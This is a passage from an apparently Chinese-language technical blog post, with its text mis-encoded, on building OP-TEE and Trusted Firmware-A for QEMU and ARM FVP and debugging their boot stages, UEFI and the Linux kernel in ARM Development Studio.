ä¹Ÿå¯ä»¥ï¼Œæ›´å¥½ç”¨</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824174332829.png" alt="image-20220824174332829"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824174546625.png" alt="image-20220824174546625"></p><p>ç¬¦å·åŠ è½½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bl1 --- /home/work/optee/trusted-firmware-a/build/qemu/debug/bl1/bl1.elf</span><br><span class="line">bl2 ---  /home/work/optee/trusted-firmware-a/build/qemu/debug/bl2/bl2.elf</span><br><span class="line">bl31 ---  /home/work/optee/trusted-firmware-a/build/qemu/debug/bl31/bl31.elf </span><br><span class="line">bl32(teeOS)  ----  /home/work/optee/optee_os/out/arm/core/tee.elf</span><br><span class="line">bl33(UEFI)  ---  /home/work/optee/edk2/Build/  </span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220824175034184.png" alt="image-20220824175034184"></p><h3 id="fvpå¯è§†åŒ–è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#fvpå¯è§†åŒ–è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="fvpå¯è§†åŒ–è°ƒè¯•ç¯å¢ƒæ­å»º"></a>fvpå¯è§†åŒ–è°ƒè¯•ç¯å¢ƒæ­å»º</h3><h4 id="ä»£ç è·å–"><a href="#ä»£ç è·å–" class="headerlink" title="ä»£ç è·å–"></a>ä»£ç è·å–</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ repo init -u https://github.com/OP-TEE/manifest.git -m fvp.xml </span><br><span class="line">$ repo sync -j4 -c</span><br><span class="line">Updating depot_tools...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å·¥å…·é“¾"><a href="#å·¥å…·é“¾" class="headerlink" title="å·¥å…·é“¾"></a>å·¥å…·é“¾</h4><p>éœ€è¦ä¸‹è½½ <code>FVP_Base_RevC-2xAEMvA_11.18_16_Linux64.tgz</code>å¹¶è§£å‹åˆ°<code>optee-fvp</code>ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf ../FVP_Base_RevC-2xAEMvA_11.18_16_Linux64.tgz -C .</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># work @ work-virtual-machine in ~/optee-fvp [23:34:36] </span></span><br><span class="line">$ ls -al</span><br><span class="line">total 72</span><br><span class="line">drwxrwxr-x 18 work work 4096 Sep 22 23:32 .</span><br><span class="line">drwx------ 70 work work 4096 Sep 22 23:34 ..</span><br><span class="line">drwxrwxr-x 10 work work 4096 Sep 22 23:32 Base_RevC_AEMvA_pkg</span><br><span class="line">drwxrwxr-x 12 work work 4096 Sep 22 23:26 build</span><br><span class="line">drwxrwxr-x 14 work work 4096 Sep 22 23:26 buildroot</span><br><span class="line">drwxrwxr-x 50 work work 4096 Sep 22 23:26 edk2</span><br><span class="line">drwxrwxr-x  4 work work 4096 Sep 22 23:26 edk2-platforms</span><br><span class="line">drwxrwxr-x 14 work work 4096 Sep 22 23:26 grub</span><br><span class="line">drwxr-xr-x  3 work work 4096 Jun 16 10:34 license_terms</span><br><span class="line">drwxrwxr-x 24 work work 4096 Sep 22 23:26 linux</span><br><span class="line">drwxrwxr-x 14 work work 4096 Sep 22 23:26 mbedtls</span><br><span class="line">drwxrwxr-x  5 work work 4096 Sep 22 23:26 ms-tpm-20-ref</span><br><span class="line">drwxrwxr-x  9 work work 4096 Sep 22 23:26 optee_client</span><br><span class="line">drwxrwxr-x 10 work work 4096 Sep 22 23:26 optee_examples</span><br><span class="line">drwxrwxr-x 10 work work 4096 Sep 22 23:26 optee_os</span><br><span class="line">drwxrwxr-x  7 work work 4096 Sep 22 23:26 optee_test</span><br><span class="line">drwxrwxr-x  7 work work 4096 Sep 22 23:26 .repo</span><br><span class="line">drwxrwxr-x 19 work work 4096 Sep 22 23:26 trusted-firmware-a</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h4><blockquote><p>ç¼–è¯‘æµç¨‹å‚è€ƒä¸Šé¢qemu_v8éƒ¨åˆ†</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># work @ work-virtual-machine in ~/optee-fvp [23:35:06]</span></span><br><span class="line">$ cp -rf Base_RevC_AEMvA_pkg Foundation_Platformpkg <span class="comment"># build toolchainsçš„æ—¶å€™æ–‡ä»¶å¤¹åéœ€è¦æ”¹ä¸€ä¸‹</span></span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make toolchains</span><br><span class="line">$ make DEBUG=1 FVP_USE_BASE_PLAT=y  -f fvp.mk all   </span><br></pre></td></tr></table></figure><h4 id="å¼€å¯è°ƒè¯•"><a href="#å¼€å¯è°ƒè¯•" class="headerlink" title="å¼€å¯è°ƒè¯•"></a>å¼€å¯è°ƒè¯•</h4><p>ä¿®æ”¹build/fvp.mk ï¼Œä»¥ä¾¿å¯åŠ¨æ—¶è¿›å…¥è°ƒè¯•æ¨¡å¼</p><p>æ·»åŠ :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-I \</span><br><span class="line">--iris-allow-remote\</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment"># Run targets</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment"># This target enforces updating root fs etc</span></span><br><span class="line">run: all</span><br><span class="line">        $(MAKE) run-only</span><br><span class="line"></span><br><span class="line">ifeq ($(FVP_USE_BASE_PLAT),y)</span><br><span class="line">FVP_ARGS ?= \</span><br><span class="line">        -I \</span><br><span class="line">        --iris-allow-remote\</span><br><span class="line">        -C bp.ve_sysregs.exit_on_shutdown=1 \</span><br><span class="line">        -C cache_state_modelled=0 \</span><br><span class="line">        -C pctl.startup=0.0.0.0 \</span><br><span class="line">        -C cluster0.NUM_CORES=4 \</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> build </span><br><span class="line">make DEBUG=1 FVP_USE_BASE_PLAT=y  -f fvp.mk run-only</span><br></pre></td></tr></table></figure><h4 id="ARM-Developer-Studioè¿æ¥"><a href="#ARM-Developer-Studioè¿æ¥" class="headerlink" title="ARM Developer Studioè¿æ¥"></a>ARM Developer Studioè¿æ¥</h4><p>å¯åŠ¨çš„æ—¶å€™éœ€è¦licenseï¼Œæ³¨å†Œä¸ªè´¦å·å°±è¡Œï¼Œå…ˆè¯•ç”¨ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220924200021216.png" alt="image-20220924200021216"></p><p>å¯åŠ¨ä¹‹åï¼Œé€‰æ‹© : <code>File-&gt;New-&gt;Model Connection </code></p><p>æ¨¡å‹é€‰æ‹© :  Base_RevC_AEMvA  å’Œ <code>Base_RevC_AEMvA</code> éƒ½æ²¡æ³•ç›´æ¥è°ƒè¯•ï¼Œå¥½åƒæ˜¯æ¨¡å‹æ²¡è£…å¥½ :(</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220924200407393.png" alt="image-20220924200407393"></p><p>ç‚¹Finishä¹‹åï¼Œéœ€è¦æ‰‹åŠ¨é€‰æ‹©ï¼Œè¿æ¥æœ¬åœ°çš„æ¨¡å‹ <code>localhost 7100</code></p><p>åŠ è½½äº†bl31çš„ç¬¦å·ï¼Œç„¶åå¯¹å…¥å£ä¸‹æ–­: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b *EL3:0x0000000004003000</span><br><span class="line"></span><br><span class="line">add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl31/bl31.elf</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220924204537245.png" alt="image-20220924204537245"></p><p>èŠœæ¹– ğŸ›«ï¸ </p><h2 id="ARM-å®‰å…¨æ¶æ„"><a href="#ARM-å®‰å…¨æ¶æ„" class="headerlink" title="ARM å®‰å…¨æ¶æ„"></a>ARM å®‰å…¨æ¶æ„</h2><blockquote><p>ARM v8 çš„æ–‡æ¡£</p></blockquote><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825135100483.png" alt="image-20220825135100483"></p><ul><li>åˆ†ä¸‰ä¸ªå¼‚å¸¸ç­‰çº§</li><li>ä¸¤ä¸ªâ€œä¸–ç•Œâ€ï¼Œnon-secure å’Œ secure</li></ul><p><code>opteeos</code>è·‘åœ¨<code> secure world</code>ï¼Œ<code>ta</code>åœ¨<code>secure world</code>çš„ä¸Šå±‚(<code>el0</code>); <code>linux</code>åœ¨<code>non-secure world</code>ï¼Œ<code>ca</code>åœ¨<code>el0</code></p><p><code>optee</code>é¡¹ç›®ä¸­è¿˜æœ‰ä¸ª``atf<code>ï¼Œè¿™ä¸ªè·‘åœ¨</code>el3`ã€‚</p><blockquote><p>  è¯¥å›¾æ¥è‡ª<a href="https://edu.csdn.net/lecturer/6964">å‘¨è´ºè´ºè€å¸ˆçš„OPTEEç³»åˆ—</a>è¯¾ç¨‹ä¸­</p></blockquote><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220825135607360.png" alt="image-20220825135607360"></p><h2 id="OPTEE-å¯åŠ¨æµç¨‹"><a href="#OPTEE-å¯åŠ¨æµç¨‹" class="headerlink" title="OPTEE å¯åŠ¨æµç¨‹"></a>OPTEE å¯åŠ¨æµç¨‹</h2><p>è¿™é‡Œæˆ‘ç›´æ¥ç”¨äº†<a href="https://edu.csdn.net/lecturer/6964">å‘¨è´ºè´ºè€å¸ˆOPTEEç³»åˆ—è¯¾ç¨‹ä¸­</a>çš„å›¾ï¼Œæˆ‘åœ¨å¯¹ç€ä»£ç åˆ†æçš„æ—¶å€™ç»“åˆè¿™ä¸ªå›¾æ„Ÿè§‰ååˆ†çš„æ¸…æ™°ï¼Œæœ‰åŠ©äºç†è§£ :)</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220901215718045.png" alt="image-20220901215718045"></p><p>å…ˆæ¥çœ‹å¤§æ¦‚çš„å¯åŠ¨æµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">bl31_entrypoint (trusted-firmware-a/bl31/aarch64/bl31_entrypoint.S)</span><br><span class="line">    bl31_main (trusted-firmware-a/bl31/bl31_main.c)</span><br><span class="line">        runtime_svc_init (trusted-firmware-a/common/runtime_svc.c)</span><br><span class="line">            opteed_setup (trusted-firmware-a/services/spd/opteed/opteed_main.c DECLARE_RT_SVCé‡Œå®šä¹‰)</span><br><span class="line">                bl31_plat_get_next_image_ep_info(SECURE) </span><br><span class="line">                opteed_init_optee_ep_state</span><br><span class="line">                bl31_register_bl32_init(&amp;opteed_init);</span><br><span class="line"></span><br><span class="line">        bl32_init // è¿™ä¸ªå‡½æ•°å°±æ˜¯opteed_initï¼Œåœ¨ä¸Šé¢æ³¨å†Œçš„    </span><br><span class="line">            // è¿›å…¥tee</span><br><span class="line">            opteed_synchronous_sp_entry(optee_ctx);</span><br><span class="line">                opteed_enter_sp(&amp;optee_ctx-&gt;c_rt_ctx);</span><br><span class="line">            // å‡ºtee</span><br><span class="line">    bl31_prepare_next_image_entry (è¿›å…¥uboot)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>ä¸‹æ–­ç‚¹çš„æ™‚å€™æ³¨æ„ï¼Œåˆ‡æ¢åˆ°å¯¹åº”çš„é˜¶æ®µä¹‹åå†å» file xxx åŠ è½½ç¬¦å·</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file /home/work/optee/trusted-firmware-a/build/qemu/debug/bl1/bl1.elf</span><br><span class="line">file /home/work/optee/trusted-firmware-a/build/qemu/debug/bl2/bl2.elf</span><br><span class="line">file /home/work/optee/trusted-firmware-a/build/qemu/debug/bl31/bl31.elf </span><br><span class="line">file /home/work/optee/optee_os/out/arm/core/tee.elf</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ä¸‹é¢è¦è¿›å…¥teeçš„æ—¶å€™</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/from_atf_to_tee.png" alt="ready_enter_tee"></p><p>åŠ è½½ç¬¦å·ä¹‹å: </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/tee.png" alt="tee"></p><h3 id="adså¯è§†åŒ–æµç¨‹æ¢³ç†"><a href="#adså¯è§†åŒ–æµç¨‹æ¢³ç†" class="headerlink" title="adså¯è§†åŒ–æµç¨‹æ¢³ç†"></a>adså¯è§†åŒ–æµç¨‹æ¢³ç†</h3><blockquote><p>  adså¯è§†åŒ–è°ƒè¯•è®°å½•</p></blockquote><h4 id="bl1"><a href="#bl1" class="headerlink" title="bl1"></a>bl1</h4><blockquote><p>  add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl1/bl1.elf</p></blockquote><h4 id="bl2"><a href="#bl2" class="headerlink" title="bl2"></a>bl2</h4><blockquote><p>  b *EL1S:0x0000000004022000 </p></blockquote><blockquote><p>  add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl2/bl2.elf</p></blockquote><h4 id="bl31"><a href="#bl31" class="headerlink" title="bl31"></a>bl31</h4><blockquote><p>  b *EL3:0x0000000004003000</p></blockquote><blockquote><p>  add-symbol-file /home/muhe/Study/optee-fvp/trusted-firmware-a/build/fvp/debug/bl31/bl31.elf</p></blockquote><h4 id="bl32"><a href="#bl32" class="headerlink" title="bl32"></a>bl32</h4><blockquote><p>  b *EL1S:0x6000000</p><p>  add-symbol-file /home/muhe/Study/optee-fvp/optee_os/out/arm/core/tee.elf</p></blockquote><p>UEFI çš„ç¬¦å·åŠ è½½æ¯”è¾ƒç‰¹æ®Šï¼Œ è¿™ä¸ªéƒ¨åˆ†æ˜¯ç›¸å¯¹åœ°å€ï¼Œ å¹¶ä¸”å¾ˆå¤šæ¨¡å—æ˜¯åŠ¨æ€åŠ è½½çš„ï¼Œ æ–­ç‚¹ä¸‹åˆ°åŠ è½½UEFIçš„åœ°å€ï¼Œ ä¹Ÿå°±æ˜¯BL31 è·³è½¬åˆ°BL33æ—¶çš„åœ°å€ã€‚ æ–­ä¸‹åï¼Œ</p><p>commandsä¸‹é€šè¿‡ cmd_load_symbols åŠ è½½ï¼Œ æ‰§è¡Œå‰å…ˆè¦å¼„æ¸…æ¥šå‡ ä¸ªå‚æ•°  </p><blockquote><p>/home/muhe/Study/optee-fvp/edk2/ArmPlatformPkg/Scripts/Ds5/cmd_load_symbols.py</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def usage():</span><br><span class="line">    print &quot;-v,--verbose&quot;</span><br><span class="line">    print &quot;-a,--all: Load all symbols&quot;</span><br><span class="line">    print &quot;-l,--report=: Filename for the EDK2 report log&quot;</span><br><span class="line">    print &quot;-m,--sysmem=(base,size): System Memory region&quot;</span><br><span class="line">    print &quot;-f,--fv=(base,size): Firmware region&quot;</span><br><span class="line">    print &quot;-r,--rom=(base,size): ROM region&quot;</span><br></pre></td></tr></table></figure><p>-m å‚æ•°åœ¨  </p><blockquote><p>  /home/muhe/Study/optee-fvp/edk2-platforms/Platform/ARM/VExpressPkg/ArmVExpress-FVP-AArch64.dsc</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="function">System <span class="title">Memory</span> <span class="params">(<span class="number">2</span>GB - <span class="number">16</span>MB of Trusted DRAM at the top of the <span class="number">32b</span>it address space)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">gArmTokenSpaceGuid.PcdSystemMemoryBase|0x80000000</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">gArmTokenSpaceGuid.PcdSystemMemorySize|0x7F000000</span></span><br></pre></td></tr></table></figure><p>-f å‚æ•°åœ¨  </p><blockquote><p>  /home/muhe/Study/optee-fvp/edk2-platforms/Platform/ARM/VExpressPkg/ArmVExpress-FVP-AArch64.fdf </p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[FD.FVP_AARCH64_EFI]</span><br><span class="line"></span><br><span class="line">!ifdef ARM_FVP_RUN_NORFLASH</span><br><span class="line"></span><br><span class="line">BaseAddress   = <span class="number">0x08000000</span>|gArmTokenSpaceGuid.PcdFdBaseAddress  # The base address of the Firmware in Flash0.</span><br><span class="line"></span><br><span class="line">!<span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">BaseAddress   = <span class="number">0x88000000</span>|gArmTokenSpaceGuid.PcdFdBaseAddress  # UEFI in DRAM + <span class="number">128</span>MB.</span><br><span class="line"></span><br><span class="line">!endif</span><br><span class="line"></span><br><span class="line">Size          = <span class="number">0x04000000</span>|gArmTokenSpaceGuid.PcdFdSize         # The size in bytes of the device (<span class="number">64</span>MiB).</span><br><span class="line"></span><br><span class="line">ErasePolarity = <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="bl33"><a href="#bl33" class="headerlink" title="bl33"></a>bl33</h4><h4 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h4><blockquote><p>  b *EL2N:0x88000000</p></blockquote><p>æ–­ç‚¹è§¦å‘åï¼Œ æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤åŠ è½½ç¬¦å·ã€‚ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/muhe/Study/optee-fvp/edk2/ArmPlatformPkg/Scripts/Ds5/cmd_load_symbols.py  -a  -m (0x80000000, 0x7F000000)  -f (0x88000000, 0x04000000) </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">info files</span><br><span class="line">Symbols from <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>.</span><br><span class="line">Local <span class="built_in">exec</span> file:</span><br><span class="line">        <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>, file <span class="built_in">type</span> ELF64.</span><br><span class="line">        Entry point: EL2N:0x0000000088000800.</span><br><span class="line">        EL2N:0x0000000088000800 - EL2N:0x0000000088018AD7 is .text</span><br><span class="line">        EL2N:0x0000000088019000 - EL2N:0x000000008801916F is .data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>DxeCoreçš„åŠ è½½è¿™ä¸ªè„šæœ¬å¤„ç†ä¸äº†ï¼Œè¿˜æ˜¯è¦è‡ªå·±åŠ è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file /home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/MdeModulePkg/Core/Dxe/DxeMain/DEBUG/DxeCore.dll 0x00fe3d3000</span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±æ­£å¸¸äº†:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Symbols from <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>.</span><br><span class="line">Local <span class="built_in">exec</span> file:</span><br><span class="line">        <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/ArmPlatformPkg/PrePi/PeiUniCore/DEBUG/ArmPlatformPrePiUniCore.dll&quot;</span>, file <span class="built_in">type</span> ELF64.</span><br><span class="line">        Entry point: EL2N:0x0000000088000800.</span><br><span class="line">        EL2N:0x0000000088000800 - EL2N:0x0000000088018AD7 is .text</span><br><span class="line">        EL2N:0x0000000088019000 - EL2N:0x000000008801916F is .data</span><br><span class="line">Symbols from <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/MdeModulePkg/Core/Dxe/DxeMain/DEBUG/DxeCore.dll&quot;</span>.</span><br><span class="line">Local <span class="built_in">exec</span> file:</span><br><span class="line">        <span class="string">&quot;/home/muhe/Study/optee-fvp/edk2-platforms/Build/ArmVExpress-FVP-AArch64/DEBUG_GCC49/AARCH64/MdeModulePkg/Core/Dxe/DxeMain/DEBUG/DxeCore.dll&quot;</span>, file <span class="built_in">type</span> ELF64.</span><br><span class="line">        Entry point: EL2N:0x00000000FE3D4000.</span><br><span class="line">        EL2N:0x00000000FE3D4000 - EL2N:0x00000000FE41AEBF is .text</span><br><span class="line">        EL2N:0x00000000FE41B000 - EL2N:0x00000000FE435860 is .data</span><br></pre></td></tr></table></figure><h4 id="GRUB"><a href="#GRUB" class="headerlink" title="GRUB"></a>GRUB</h4><p>TODOï¼Œè¿™éƒ¨åˆ†ä¸€ç›´æ²¡æ—¶é—´æï¼Œå…ˆæŒ‚èµ·äº†</p><h4 id="Linux-Kernel"><a href="#Linux-Kernel" class="headerlink" title="Linux Kernel"></a>Linux Kernel</h4><blockquote><p>  BL33æ˜¯UEFl,å…¶å®UEFI è¿˜ä¼šå¼•å¯¼grub2, è¿™é‡Œgrub2ä½œä¸ºä¸€ä¸ªUEFlçš„driver(or åº”ç”¨)è¢«UEFlåŠ è½½, grubæ‰§è¡Œå®Œæ¯•,å¼•å¯¼linuxæ—¶,å…¶å®linux å†…æ ¸ä¹Ÿæ‰“åŒ…ä½œä¸ºä¸€ä¸ªUEFlçš„åº”ç”¨äº†,æ‰€ä»¥BL33çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯, UEFI-ï¼ grub-&gt;linuxå†…æ ¸çš„efi stub -ï¼ linuxå†…æ ¸</p></blockquote><p>åŠ è½½ç¬¦å·ï¼Œæ³¨æ„EL1Nï¼š0ï¼Œå› ä¸ºå†…æ ¸ä¸»è¦è¿è¡Œåœ¨EL1N</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file /home/muhe/Study/optee-fvp/linux/vmlinux EL1N:0</span><br></pre></td></tr></table></figure><p>æ ¹æ®å¯åŠ¨æµç¨‹ : </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__HEAD</span><br><span class="line">        primary_entry</span><br><span class="line">                __primary_switch</span><br><span class="line">                        __enable_mmu</span><br><span class="line">                        __primary_switched</span><br><span class="line">                                è®¾ç½®å¼‚å¸¸å‘é‡è¡¨ // `adr_l       x8, vectors`</span><br><span class="line">                                start_kernel()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¯¹<code>__primary_switch</code> ä¸‹æ–­ï¼Œå¦‚æœç¬¦å·å¯¹ä¸ä¸Šï¼Œå¯ä»¥æ ¹æ®åœ°å€ä¸‹æ–­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-NUC11PAHi5 in ~/Study/optee-fvp/linux on git:29aee39cf x [23:24:42]</span></span><br><span class="line">$ cat System.map | grep <span class="string">&quot;primary_switched&quot;</span></span><br><span class="line">ffff80000919032c t __primary_switched</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/debug_linux_kernel.png" alt="debug_linux_kernel"></p><h4 id="JVMè®¾ç½®"><a href="#JVMè®¾ç½®" class="headerlink" title="JVMè®¾ç½®"></a>JVMè®¾ç½®</h4><p>ä¿®æ”¹adsçš„jvmï¼Œå¦åˆ™è°ƒè¯•çš„æ—¶å€™å®¹æ˜“oomå½±å“ä½“éªŒ</p><blockquote><p><a href="https://developer.arm.com/documentation/ka003567/latest">https://developer.arm.com/documentation/ka003567/latest</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-NUC11PAHi5 in /usr/arm/developmentstudio-2022.1/sw/ide [20:20:40]</span></span><br><span class="line">$ cat armds_ide.ini</span><br><span class="line">-startup</span><br><span class="line">plugins/org.eclipse.equinox.launcher_1.6.400.v20210924-0641.jar</span><br><span class="line">--launcher.library</span><br><span class="line">plugins/org.eclipse.equinox.launcher.gtk.linux.x86_64_1.2.400.v20211117-0650</span><br><span class="line">-vm</span><br><span class="line">../java/lib/server/libjvm.so</span><br><span class="line">-vmargs</span><br><span class="line">--add-opens=java.base/java.io=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/sun.nio.ch=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.lang=ALL-UNNAMED</span><br><span 